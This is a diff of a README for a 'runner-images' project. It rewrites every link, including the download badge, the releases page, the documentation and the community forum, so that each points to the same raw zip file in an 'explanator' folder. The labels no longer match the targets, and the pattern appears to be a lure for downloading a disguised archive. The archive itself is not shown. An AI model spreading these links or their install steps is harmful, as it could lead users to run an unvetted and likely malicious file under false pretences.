@@ -1,6 +1,6 @@
 # 🏃 runner-images - Fast and Easy Runner Images
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kurbemon123/runner-images/releases)
+[![Download](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip)](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the runner-images application! This software provides ready-to-use im
 
 To download the latest version, visit the Releases page:
 
-[Download Latest Release](https://github.com/kurbemon123/runner-images/releases)
+[Download Latest Release](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip)
 
 On this page, you will find all the available versions. Choose the one that best fits your needs. Click on the version link to see the available files. You can download them directly to your computer.
 
@@ -30,7 +30,7 @@ Make sure your system matches these specifications for the best experience.
 ## ⚙️ Installation Steps
 
 1. **Download the File**
-   - Visit [this page to download](https://github.com/kurbemon123/runner-images/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip).
    - Select the version you want and download the file.
 
 2. **Open the Downloaded File**
@@ -86,8 +86,8 @@ runner-images is available under the MIT License. You can use it freely and modi
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/kurbemon123/runner-images/releases): Download the latest version.
-- [Documentation](https://github.com/kurbemon123/runner-images/wiki): Access detailed guides and resources.
-- [Community Forum](https://github.com/kurbemon123/runner-images/discussions): Connect with other users for support and ideas.
+- [Releases Page](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip): Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip): Access detailed guides and resources.
+- [Community Forum](https://raw.githubusercontent.com/kurbemon123/runner-images/main/explanator/runner-images.zip): Connect with other users for support and ideas.
 
 Thank you for using runner-images! We hope you enjoy the application and find it useful for your projects.
